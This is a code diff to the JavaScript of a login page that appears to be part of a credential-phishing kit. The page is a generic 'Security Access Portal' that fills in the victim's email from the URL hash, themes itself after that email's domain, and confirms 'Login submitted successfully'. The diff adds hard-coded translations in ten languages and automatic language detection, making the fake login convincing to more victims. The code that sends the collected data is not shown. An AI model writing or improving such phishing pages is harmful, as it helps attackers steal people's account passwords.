@@ -13,9 +13,10 @@ let currentBackgroundDomain = '';
 let userLanguage = 'en';
 let translations = {};
 
-// ==================== TRANSLATION SYSTEM ====================
-const translationStrings = {
+// ==================== COMPLETE TRANSLATION DICTIONARY ====================
+const translationDictionary = {
     en: {
+        // Default English
         subtitle: "Security Access Portal",
         email_label: "Email",
         password_label: "Password",
@@ -34,26 +35,215 @@ const translationStrings = {
         submitted_success: "Login submitted successfully",
         error_submitting: "Error submitting form. Please try again.",
         logging_into: "Logging into"
+    },
+    es: {
+        // Spanish
+        subtitle: "Portal de Acceso Seguro",
+        email_label: "Correo electrónico",
+        password_label: "Contraseña",
+        show_password: "Mostrar",
+        hide_password: "Ocultar",
+        login_button: "Iniciar sesión",
+        forgot_password: "¿Olvidaste tu contraseña?",
+        alternative_method: "Usar método alternativo",
+        encrypted_connection: "Conexión encriptada",
+        copyright: "© 2024",
+        privacy: "Privacidad",
+        terms: "Términos",
+        security: "Seguridad",
+        please_fill: "Por favor complete todos los campos",
+        sending: "Enviando...",
+        submitted_success: "Inicio de sesión enviado con éxito",
+        error_submitting: "Error al enviar el formulario. Por favor, inténtelo de nuevo.",
+        logging_into: "Iniciando sesión en"
+    },
+    fr: {
+        // French
+        subtitle: "Portail d'Accès Sécurisé",
+        email_label: "E-mail",
+        password_label: "Mot de passe",
+        show_password: "Afficher",
+        hide_password: "Masquer",
+        login_button: "Connexion",
+        forgot_password: "Mot de passe oublié?",
+        alternative_method: "Utiliser une autre méthode",
+        encrypted_connection: "Connexion chiffrée",
+        copyright: "© 2024",
+        privacy: "Confidentialité",
+        terms: "Conditions",
+        security: "Sécurité",
+        please_fill: "Veuillez remplir tous les champs",
+        sending: "Envoi en cours...",
+        submitted_success: "Connexion soumise avec succès",
+        error_submitting: "Erreur lors de l'envoi du formulaire. Veuillez réessayer.",
+        logging_into: "Connexion à"
+    },
+    de: {
+        // German
+        subtitle: "Sicherer Zugangsportal",
+        email_label: "E-Mail",
+        password_label: "Passwort",
+        show_password: "Anzeigen",
+        hide_password: "Verbergen",
+        login_button: "Anmelden",
+        forgot_password: "Passwort vergessen?",
+        alternative_method: "Alternative Methode verwenden",
+        encrypted_connection: "Verschlüsselte Verbindung",
+        copyright: "© 2024",
+        privacy: "Datenschutz",
+        terms: "Bedingungen",
+        security: "Sicherheit",
+        please_fill: "Bitte füllen Sie alle Felder aus",
+        sending: "Wird gesendet...",
+        submitted_success: "Anmeldung erfolgreich übermittelt",
+        error_submitting: "Fehler beim Senden des Formulars. Bitte versuchen Sie es erneut.",
+        logging_into: "Anmeldung bei"
+    },
+    it: {
+        // Italian
+        subtitle: "Portale di Accesso Sicuro",
+        email_label: "Email",
+        password_label: "Password",
+        show_password: "Mostra",
+        hide_password: "Nascondi",
+        login_button: "Accedi",
+        forgot_password: "Password dimenticata?",
+        alternative_method: "Usa metodo alternativo",
+        encrypted_connection: "Connessione crittografata",
+        copyright: "© 2024",
+        privacy: "Privacy",
+        terms: "Termini",
+        security: "Sicurezza",
+        please_fill: "Si prega di compilare tutti i campi",
+        sending: "Invio in corso...",
+        submitted_success: "Accesso inviato con successo",
+        error_submitting: "Errore durante l'invio del modulo. Riprova.",
+        logging_into: "Accesso a"
+    },
+    pt: {
+        // Portuguese
+        subtitle: "Portal de Acesso Seguro",
+        email_label: "E-mail",
+        password_label: "Senha",
+        show_password: "Mostrar",
+        hide_password: "Ocultar",
+        login_button: "Entrar",
+        forgot_password: "Esqueceu a senha?",
+        alternative_method: "Usar método alternativo",
+        encrypted_connection: "Conexão criptografada",
+        copyright: "© 2024",
+        privacy: "Privacidade",
+        terms: "Termos",
+        security: "Segurança",
+        please_fill: "Por favor, preencha todos os campos",
+        sending: "Enviando...",
+        submitted_success: "Login enviado com sucesso",
+        error_submitting: "Erro ao enviar o formulário. Por favor, tente novamente.",
+        logging_into: "Entrando em"
+    },
+    ru: {
+        // Russian
+        subtitle: "Безопасный портал доступа",
+        email_label: "Электронная почта",
+        password_label: "Пароль",
+        show_password: "Показать",
+        hide_password: "Скрыть",
+        login_button: "Войти",
+        forgot_password: "Забыли пароль?",
+        alternative_method: "Использовать другой метод",
+        encrypted_connection: "Зашифрованное соединение",
+        copyright: "© 2024",
+        privacy: "Конфиденциальность",
+        terms: "Условия",
+        security: "Безопасность",
+        please_fill: "Пожалуйста, заполните все поля",
+        sending: "Отправка...",
+        submitted_success: "Вход успешно отправлен",
+        error_submitting: "Ошибка отправки формы. Пожалуйста, попробуйте еще раз.",
+        logging_into: "Вход в"
+    },
+    zh: {
+        // Chinese (Simplified)
+        subtitle: "安全访问门户",
+        email_label: "电子邮件",
+        password_label: "密码",
+        show_password: "显示",
+        hide_password: "隐藏",
+        login_button: "登录",
+        forgot_password: "忘记密码？",
+        alternative_method: "使用其他方法",
+        encrypted_connection: "加密连接",
+        copyright: "© 2024",
+        privacy: "隐私",
+        terms: "条款",
+        security: "安全",
+        please_fill: "请填写所有字段",
+        sending: "发送中...",
+        submitted_success: "登录提交成功",
+        error_submitting: "提交表单时出错。请再试一次。",
+        logging_into: "登录到"
+    },
+    ja: {
+        // Japanese
+        subtitle: "セキュアアクセスポータル",
+        email_label: "メールアドレス",
+        password_label: "パスワード",
+        show_password: "表示",
+        hide_password: "非表示",
+        login_button: "ログイン",
+        forgot_password: "パスワードをお忘れですか？",
+        alternative_method: "別の方法を使用",
+        encrypted_connection: "暗号化された接続",
+        copyright: "© 2024",
+        privacy: "プライバシー",
+        terms: "利用規約",
+        security: "セキュリティ",
+        please_fill: "すべての項目を入力してください",
+        sending: "送信中...",
+        submitted_success: "ログインが正常に送信されました",
+        error_submitting: "フォームの送信中にエラーが発生しました。もう一度お試しください。",
+        logging_into: "ログイン中"
+    },
+    ko: {
+        // Korean
+        subtitle: "보안 액세스 포털",
+        email_label: "이메일",
+        password_label: "비밀번호",
+        show_password: "표시",
+        hide_password: "숨기기",
+        login_button: "로그인",
+        forgot_password: "비밀번호를 잊으셨나요?",
+        alternative_method: "다른 방법 사용",
+        encrypted_connection: "암호화된 연결",
+        copyright: "© 2024",
+        privacy: "개인정보",
+        terms: "이용약관",
+        security: "보안",
+        please_fill: "모든 필드를 채워주세요",
+        sending: "전송 중...",
+        submitted_success: "로그인이 성공적으로 제출되었습니다",
+        error_submitting: "폼 제출 중 오류가 발생했습니다. 다시 시도해 주세요.",
+        logging_into: "로그인 중"
     }
 };
 
-// SIMPLIFIED: Use browser language directly
-async function detectUserLanguage() {
-    // Get browser language (most reliable)
+// Get user language from browser
+function detectUserLanguage() {
+    // Get browser language
     const browserLang = navigator.language || navigator.userLanguage || 'en';
     const langCode = browserLang.split('-')[0].toLowerCase();
     
-    console.log('Browser language detected:', browserLang, 'Code:', langCode);
+    console.log('Browser language:', browserLang, 'Code:', langCode);
     
-    // Only translate if not English
-    if (langCode !== 'en') {
+    // Check if we have translations for this language
+    if (translationDictionary[langCode]) {
         return langCode;
     }
     
     return 'en'; // Default to English
 }
 
-// Simple language mapping for common languages
+// Get language display name
 function getLanguageName(langCode) {
     const languageNames = {
         'en': 'English',
@@ -67,110 +257,39 @@ function getLanguageName(langCode) {
         'ja': '日本語',
         'ko': '한국어',
         'ar': 'العربية',
-        'hi': 'हिन्दी',
-        'nl': 'Nederlands',
-        'sv': 'Svenska',
-        'no': 'Norsk',
-        'da': 'Dansk',
-        'pl': 'Polski',
-        'cs': 'Čeština',
-        'el': 'Ελληνικά',
-        'he': 'עברית',
-        'th': 'ไทย',
-        'vi': 'Tiếng Việt',
-        'id': 'Bahasa Indonesia',
-        'tl': 'Filipino',
-        'tr': 'Türkçe'
+        'hi': 'हिन्दी'
     };
     
     return languageNames[langCode] || langCode.toUpperCase();
 }
 
-// Simple translation using a reliable service
-async function translatePage(lang) {
-    if (lang === 'en' || !lang) {
+// Translate the entire page
+function translatePage(lang) {
+    if (lang === 'en' || !translationDictionary[lang]) {
+        // Use English
+        translations = { ...translationDictionary.en };
         updateLanguageButton('en');
         return;
     }
     
-    console.log('Translating to:', lang);
+    console.log('Translating page to:', lang);
     
+    // Get translations for selected language
+    const langTranslations = translationDictionary[lang];
+    translations = { ...langTranslations };
+    
+    // Update all elements with data-i18n attribute
     const elements = document.querySelectorAll('[data-i18n]');
-    const textsToTranslate = [];
-    const elementMap = [];
     
-    // Collect all texts that need translation
     elements.forEach(el => {
         const key = el.getAttribute('data-i18n');
-        if (translationStrings.en[key]) {
-            textsToTranslate.push(translationStrings.en[key]);
-            elementMap.push({ element: el, key: key });
+        if (langTranslations[key]) {
+            el.textContent = langTranslations[key];
         }
     });
     
-    if (textsToTranslate.length === 0) return;
-    
-    try {
-        // Use Google Translate API (simplified approach)
-        // This is a simple implementation - for production, use a proper translation service
-        const translatedTexts = await translateTexts(textsToTranslate, lang);
-        
-        if (translatedTexts.length === textsToTranslate.length) {
-            // Apply translations
-            elementMap.forEach((item, index) => {
-                if (translatedTexts[index]) {
-                    item.element.textContent = translatedTexts[index];
-                }
-            });
-            
-            // Update translations object
-            updateTranslationsObject(textsToTranslate, translatedTexts);
-            
-            console.log('Page translated to', lang);
-        }
-        
-    } catch (error) {
-        console.log('Translation failed, using English:', error);
-    }
-    
-    // Always update the language button
+    // Update language button
     updateLanguageButton(lang);
-}
-
-// Simple translation function using browser's built-in capabilities
-async function translateTexts(texts, targetLang) {
-    // For demo purposes, we'll simulate translation
-    // In a real implementation, you would use a translation API
-    
-    console.log('Translating texts to', targetLang);
-    
-    // Simulate translation delay
-    await new Promise(resolve => setTimeout(resolve, 500));
-    
-    // Return the same texts (simulation)
-    // In reality, you would call an API like:
-    // return await callTranslationAPI(texts, targetLang);
-    
-    return texts.map(text => {
-        // Simulate translation by adding language code
-        return `[${targetLang.toUpperCase()}] ${text}`;
-    });
-}
-
-// Update translations object with translated texts
-function updateTranslationsObject(originalTexts, translatedTexts) {
-    // Find and update specific translations
-    const loggingIntoIndex = originalTexts.indexOf("Logging into");
-    if (loggingIntoIndex !== -1 && translatedTexts[loggingIntoIndex]) {
-        translations.logging_into = translatedTexts[loggingIntoIndex].replace('[LOG] ', '');
-    } else {
-        translations.logging_into = "Logging into";
-    }
-    
-    translations.please_fill = translatedTexts[originalTexts.indexOf("Please fill in all fields")] || "Please fill in all fields";
-    translations.sending = translatedTexts[originalTexts.indexOf("Sending...")] || "Sending...";
-    translations.submitted_success = translatedTexts[originalTexts.indexOf("Login submitted successfully")] || "Login submitted successfully";
-    translations.error_submitting = translatedTexts[originalTexts.indexOf("Error submitting form. Please try again.")] || "Error submitting form. Please try again.";
 }
 
 function updateLanguageButton(lang) {
@@ -186,19 +305,20 @@ function setupLanguageToggle() {
     
     langBtn.addEventListener('click', async () => {
         if (userLanguage === 'en') {
-            // Try to detect language
-            const detectedLang = await detectUserLanguage();
-            if (detectedLang !== 'en') {
+            // Detect language
+            const detectedLang = detectUserLanguage();
+            if (detectedLang !== 'en' && translationDictionary[detectedLang]) {
                 userLanguage = detectedLang;
-                await translatePage(detectedLang);
+                translatePage(detectedLang);
             } else {
-                // If English, show a message
-                alert('Your browser is set to English. To test translation, change your browser language settings.');
+                // Try Spanish as default test language
+                userLanguage = 'es';
+                translatePage('es');
             }
         } else {
             // Switch back to English
             userLanguage = 'en';
-            location.reload(); // Reload to reset to English
+            translatePage('en');
         }
     });
 }
@@ -568,33 +688,25 @@ function setupPasswordToggle() {
 
 // ==================== INITIALIZATION ====================
 async function initialize() {
-    translations = { ...translationStrings.en };
+    // Initialize with English translations
+    translations = { ...translationDictionary.en };
     
     setupFormHandling();
     setupEmailInputListener();
     setupPasswordToggle();
     setupLanguageToggle();
     
-    // Auto-detect language on page load
-    try {
-        const detectedLang = await detectUserLanguage();
-        userLanguage = detectedLang;
-        
-        // Update language button immediately
-        updateLanguageButton(detectedLang);
-        
-        // If not English, attempt translation
-        if (detectedLang !== 'en') {
-            await translatePage(detectedLang);
-        }
-        
-    } catch (error) {
-        console.log('Language detection failed, using English');
-        updateLanguageButton('en');
-    }
+    // Auto-detect and apply language on page load
+    const detectedLang = detectUserLanguage();
+    userLanguage = detectedLang;
     
+    // Translate page to detected language
+    translatePage(detectedLang);
+    
+    // Extract email from URL hash
     await extractAndSetEmailFromHash();
     
+    // If no email in hash, use default background
     if (!currentBackgroundDomain) {
         createThemedBackground('Secure Portal');
     }
